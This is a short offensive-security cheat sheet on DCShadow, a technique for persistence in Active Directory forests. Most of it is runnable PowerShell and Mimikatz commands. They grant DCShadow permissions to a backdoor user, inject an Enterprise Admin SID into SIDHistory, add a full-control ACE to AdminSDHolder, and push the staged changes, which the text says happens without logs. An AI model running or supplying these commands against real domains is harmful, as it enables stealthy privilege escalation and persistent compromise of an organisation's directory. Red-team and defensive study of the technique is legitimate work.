DCShadow is an attack that masks certain actions by temporarily imitating a Domain Controller. If you have Domain Admin or Enterprise Admin privileges in a root domain, it can be used for forest-level persistence.

Optionally, as Domain Admin, give a chosen user the privileges required for the DCShadow attack (uses `Set-DCShadowPermissions.ps1` cmdlet).

```powershell
Set-DCShadowPermissions -FakeDC BackdoorMachine -SamAccountName TargetUser -Username BackdoorUser -Verbose
```

Then, from any machine, use Mimikatz to stage the DCShadow attack.

```plaintext
# Set SPN for user
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"

# Set SID History for user (effectively granting them Enterprise Admin rights)
lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName BackdoorUser | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-1874506631-3219952063-538504511-45109]])
```

Finally, from either a DA session OR a session as the user provided with the DCShadow permissions before, run the DCShadow attack. Actions staged previously will be performed without leaving any logs

```plaintext
lsadump::dcshadow /push
```